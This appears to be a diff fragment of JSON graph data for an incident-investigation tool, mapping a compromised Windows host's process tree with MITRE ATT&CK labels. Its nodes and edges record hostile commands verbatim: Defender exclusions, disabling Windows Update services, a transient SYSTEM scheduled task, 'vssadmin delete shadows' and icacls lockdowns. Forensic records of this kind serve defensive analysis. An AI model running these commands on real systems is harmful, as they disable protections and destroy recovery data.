+        }
+      },
+      {
+        "id": "p-4eGL+sXlneC7/3dVonff+A",
+        "type": "customNode",
+        "position": {
+          "x": 5030,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "reg.exe",
+          "type": "other",
+          "hostname": "pid 12584",
+          "ipAddress": "",
+          "os": "17:32:23 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-4eGL+sXl",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v NoAutoUpdate /t REG_DWORD /d 1 /f  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\reg.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-lHF9fls9NqxKVJ7nqj0cRw",
+        "type": "customNode",
+        "position": {
+          "x": 5360,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "powershell.exe",
+          "type": "other",
+          "hostname": "pid 13372",
+          "ipAddress": "",
+          "os": "17:32:23 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-lHF9fls9",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "powershell  -NoProfile -WindowStyle Hidden -Command \"& {Get-ScheduledTask -TaskPath '\\Microsoft\\Windows\\InstallService\\*' | Disable-ScheduledTask -ErrorAction SilentlyContinue; Get-ScheduledTask -TaskPath '\\Microsoft\\Windows\\UpdateOrchestrator\\*' | Disable-ScheduledTask -ErrorAction SilentlyContinue"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-9AOPGW9MUPJrv/zoPl5J9w",
+        "type": "customNode",
+        "position": {
+          "x": 5690,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 21820",
+          "ipAddress": "",
+          "os": "17:32:25 UTC",
+          "criticality": "Medium",
+          "services": [
+            "SYSTEM"
+          ],
+          "actions": [
+            {
+              "id": "act-9AOPGW9M",
+              "type": "Persistence",
+              "technique": "T1112 Modify Registry",
+              "details": "\"cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"C:\\Program Files (x86)\\5FhqHn\" /t REG_DWORD /d 0 /f"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-hEYA5Vl3F2lRFQ/N5b9Cmw",
+        "type": "customNode",
+        "position": {
+          "x": 6350,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "powershell.exe",
+          "type": "other",
+          "hostname": "pid 18604",
+          "ipAddress": "",
+          "os": "17:32:26 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-hEYA5Vl3",
+              "type": "Defense Evasion",
+              "technique": "T1562.001 Disable or Modify Tools",
+              "details": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Add-MpPreference -ExclusionPath 'C:\\ProgramData','C:\\Users','C:\\Program Files (x86)' -Force"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-HkQ8l8KKsNE1T5Qn6sT63Q",
+        "type": "customNode",
+        "position": {
+          "x": 6020,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 23244",
+          "ipAddress": "",
+          "os": "17:32:28 UTC",
+          "criticality": "Medium",
+          "services": [
+            "SYSTEM"
+          ],
+          "actions": [
+            {
+              "id": "act-HkQ8l8KK",
+              "type": "Persistence",
+              "technique": "T1112 Modify Registry",
+              "details": "\"cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"C:\\ProgramData\" /t REG_DWORD /d 0 /f"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-yoRuB0kz8pCoJ0Q7JOsWug",
+        "type": "customNode",
+        "position": {
+          "x": 6680,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe  x3",
+          "type": "other",
+          "hostname": "pid 9428",
+          "ipAddress": "",
+          "os": "17:32:33 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-yoRuB0kz",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd /c echo.>c:\\xxxx.ini"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe  [repeated 3x until 17:32:35 UTC]",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-3i0MsqIRnMGVoF1FhAx2ng",
+        "type": "customNode",
+        "position": {
+          "x": 7010,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 25140",
+          "ipAddress": "",
+          "os": "17:32:42 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-3i0MsqIR",
+              "type": "Persistence",
+              "technique": "T1112 Modify Registry",
+              "details": "\"C:\\Windows\\System32\\cmd.exe\" cmd.exe /q /c \"@echo off & (for %i in (wuauserv UsoSvc uhssvc WaaSMedicSvc) do (     net stop %i >nul 2>&1 &     sc config %i start= disabled >nul 2>&1 &     sc failure %i reset= 0 actions= \"\" >nul 2>&1 )) & (for %i in (WaaSMedicSvc wuaueng) do (     takeown /f C:\\Windo"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-V2QPDW3ox7IlBto5sydKVA",
+        "type": "customNode",
+        "position": {
+          "x": 3380,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "net.exe",
+          "type": "other",
+          "hostname": "pid 13976",
+          "ipAddress": "",
+          "os": "17:32:43 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-V2QPDW3o",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "net  stop wuauserv  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\net.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-dUrJm3OSydVembHcpVwH9Q",
+        "type": "customNode",
+        "position": {
+          "x": 80,
+          "y": 890
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "net1.exe",
+          "type": "other",
+          "hostname": "pid 3112",
+          "ipAddress": "",
+          "os": "17:32:43 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-dUrJm3OS",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "C:\\Windows\\system32\\net1  stop wuauserv  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\net1.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-yrjj5NRdsdauQBBqFSVU9Q",
+        "type": "customNode",
+        "position": {
+          "x": 3710,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "sc.exe",
+          "type": "other",
+          "hostname": "pid 21432",
+          "ipAddress": "",
+          "os": "17:32:46 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-yrjj5NRd",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "sc  config wuauserv start= disabled  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\sc.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-JMdYId4n30KYRrAke9U9aw",
+        "type": "customNode",
+        "position": {
+          "x": 4040,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "sc.exe",
+          "type": "other",
+          "hostname": "pid 13516",
+          "ipAddress": "",
+          "os": "17:32:46 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-JMdYId4n",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "sc  failure wuauserv reset= 0 actions= \"\"  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\sc.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-mYiXdvBx5dr9dRR88DApzg",
+        "type": "customNode",
+        "position": {
+          "x": 4370,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "net.exe",
+          "type": "other",
+          "hostname": "pid 1584",
+          "ipAddress": "",
+          "os": "17:32:46 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-mYiXdvBx",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "net  stop UsoSvc  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\net.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-LautZER+4O45+ZfUsmmqpA",
+        "type": "customNode",
+        "position": {
+          "x": 410,
+          "y": 890
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "net1.exe",
+          "type": "other",
+          "hostname": "pid 17904",
+          "ipAddress": "",
+          "os": "17:32:47 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-LautZER+",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "C:\\Windows\\system32\\net1  stop UsoSvc  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\net1.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-kbcVo2vyZIAZoGbKXjCrzw",
+        "type": "customNode",
+        "position": {
+          "x": 2060,
+          "y": 290
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "reg.exe",
+          "type": "other",
+          "hostname": "pid 6240",
+          "ipAddress": "",
+          "os": "17:33:07 UTC",
+          "criticality": "Medium",
+          "services": [
+            "SYSTEM"
+          ],
+          "actions": [
+            {
+              "id": "act-kbcVo2vy",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"C:\\Program Files (x86)\\5FhqHn\" /t REG_DWORD /d 0 /f"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\reg.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-IP3KLy3mQaNwpPgXZTHy3g",
+        "type": "customNode",
+        "position": {
+          "x": 2390,
+          "y": 290
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "reg.exe",
+          "type": "other",
+          "hostname": "pid 9792",
+          "ipAddress": "",
+          "os": "17:33:10 UTC",
+          "criticality": "Medium",
+          "services": [
+            "SYSTEM"
+          ],
+          "actions": [
+            {
+              "id": "act-IP3KLy3m",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"C:\\ProgramData\" /t REG_DWORD /d 0 /f"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\reg.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      }
+    ],
+    "edges": [
+      {
+        "id": "e-1jMfUzs+-qFmcvO2D",
+        "source": "p-1jMfUzs+wV2QPkta1qeSdg",
+        "target": "p-qFmcvO2Dtq754MgKFN7lpA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Defense Evasion",
+          "toolUsed": "powershell.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:30:11.4968236Z",
+          "description": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Add-MpPreference -ExclusionPath 'C:\\ProgramData','C:\\Users','C:\\Program Files (x86)','C:\\' -Force",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1562.001",
+          "mitreAttackName": "Disable or Modify Tools",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1562.001",
+              "name": "Disable or Modify Tools"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-1jMfUzs+-4uJKkohe",
+        "source": "p-1jMfUzs+wV2QPkta1qeSdg",
+        "target": "p-4uJKkoheeYQlJHnrSAFNDw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Persistence",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:30:11.862465Z",
+          "description": "\"C:\\Windows\\System32\\cmd.exe\" cmd.exe /c SCHTASKS /Create /F /TN \"Task1\" /SC ONCE /ST 00:00 /RL HIGHEST /RU \"SYSTEM\" /TR \"cmd.exe /c reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\\" /v \\\"C:\\Users\\Public\\Br3N37\\\" /t REG_DWORD /d 0 /f\" & SCHTASKS /Run /TN \"Task1\" & SCHTASKS /Delete /TN \"Task1\" /F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1053.005",
+          "mitreAttackName": "Scheduled Task",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1053.005",
+              "name": "Scheduled Task"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-4uJKkohe-wCsNKTN+",
+        "source": "p-4uJKkoheeYQlJHnrSAFNDw",
+        "target": "p-wCsNKTN+scr0wqlQfmzYnA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Persistence",
+          "toolUsed": "schtasks.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:30:14.3189649Z",
+          "description": "SCHTASKS  /Create /F /TN \"Task1\" /SC ONCE /ST 00:00 /RL HIGHEST /RU \"SYSTEM\" /TR \"cmd.exe /c reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\\" /v \\\"C:\\Users\\Public\\Br3N37\\\" /t REG_DWORD /d 0 /f\" ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1053.005",
+          "mitreAttackName": "Scheduled Task",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1053.005",
+              "name": "Scheduled Task"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-4uJKkohe-XSLa1zfk",
+        "source": "p-4uJKkoheeYQlJHnrSAFNDw",
+        "target": "p-XSLa1zfkwE3tIQhgPyAD9Q",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Persistence",
+          "toolUsed": "schtasks.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:30:17.0050886Z",
+          "description": "SCHTASKS  /Run /TN \"Task1\" ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1053.005",
+          "mitreAttackName": "Scheduled Task",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1053.005",
+              "name": "Scheduled Task"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-4uJKkohe-8pbu/eav",
+        "source": "p-4uJKkoheeYQlJHnrSAFNDw",
+        "target": "p-8pbu/eavA1v3txos5AqdHg",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Persistence",
+          "toolUsed": "schtasks.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:30:19.2836178Z",
+          "description": "SCHTASKS  /Delete /TN \"Task1\" /F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1053.005",
+          "mitreAttackName": "Scheduled Task",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1053.005",
+              "name": "Scheduled Task"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-1jMfUzs+-J2ZY0Ppx",
+        "source": "p-1jMfUzs+wV2QPkta1qeSdg",
+        "target": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "yYRb4B.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:03.3894732Z",
+          "description": "\"C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe\" ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-0KeII8Gv-WZNoiPFh",
+        "source": "p-0KeII8GvMPp9eJFAzDIrew",
+        "target": "p-WZNoiPFh1ZeQFdvfq5qSqw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "reg.exe",
+          "userUsed": "SYSTEM",
+          "timestamp": "2026-08-08T17:31:08.1177837Z",
+          "description": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-i2Wu1x2y",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-i2Wu1x2y//q8IZpQJrkSBA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Impact",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:32.6907985Z",
+          "description": "cmd.exe /c vssadmin delete shadows /all /quiet",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1490",
+          "mitreAttackName": "Inhibit System Recovery",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1490",
+              "name": "Inhibit System Recovery"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-KxXX6exs",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-KxXX6exsQ7pw9dfmoHFSlQ",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:52.9544796Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\" /inheritance:r",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-VEiS1wxX",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-VEiS1wxX1sAsOfvjj/XQ+Q",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:53.4380263Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-VEiS1wxX-mGZGjoD2",
+        "source": "p-VEiS1wxX1sAsOfvjj/XQ+Q",
+        "target": "p-mGZGjoD2OKXNrrs6vEjefQ",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:53.5900921Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-rbZYUaEu",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-rbZYUaEuhjXOWSINLPRPYg",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:53.8739381Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\" /grant:r Users:(OI)(CI)(RX) /deny Users:(OI)(CI)(DC)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-rbZYUaEu-S0d0T1WL",
+        "source": "p-rbZYUaEuhjXOWSINLPRPYg",
+        "target": "p-S0d0T1WLuEc0O/IKN5LgKA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:53.998423Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\" /grant:r Users:(OI)(CI)(RX) /deny Users:(OI)(CI)(DC)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-2aHV7BEV",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-2aHV7BEVdPjppbsQUTY/yA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:54.2053127Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe\" /inheritance:r",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
